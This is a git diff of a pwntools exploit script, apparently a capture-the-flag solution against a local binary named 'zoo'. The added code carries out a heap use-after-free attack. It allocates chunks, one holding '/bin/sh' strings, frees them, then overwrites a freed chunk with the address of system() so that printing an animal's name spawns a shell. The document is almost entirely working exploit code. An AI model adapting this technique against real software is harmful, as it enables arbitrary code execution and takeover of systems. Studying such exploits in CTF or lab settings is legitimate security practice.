@@ -31,21 +31,45 @@ def debug(breakpoint=''):
 
 elf = ELF('./zoo')
 context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
-p = process("./zoo")
-system = 0x401120
 
-def create(data):
+def add_animal(name):
     sla("> ", "1")
-    sla("Type of animal?", "1")
-    sa("ame of animal", data)
+    sla("2) Panda", "1")
+    sa("Name of animal?", name)
 
-def delete(idx):
+def remove_animal(idx):
     sla("> ", "2")
-    sla("Zone number? (0-", str(idx))
+    sla("Zone number? (0-9)", str(idx))
 
-def show(idx):
+def report_name(idx):
     sla("> ", "3")
-    sla("one number", str(idx))
+    sla("Zone number? (0-9)", str(idx))
+
+
+p = process("./zoo")
+
+add_animal("a" * 0x18) #0
+add_animal("/bin/sh;/bin/sh;/bin/sh\x00") #1
+add_animal("b" * 0x18) #2
+add_animal("b" * 0x18) #3
+
+remove_animal(0)
+remove_animal(1)
+remove_animal(2)
+remove_animal(3)
+
+sys_addr = 0x401120
+add_animal(p64(sys_addr) + b"a" * 8 + b'\x10') #0
+
+# debug()
+report_name(2)
+
+
+# get_shell_addr = 0x401276
+# add_animal(0x10, p64(get_shell_addr)) #0
+# debug()
 
 
 p.interactive()
+
+
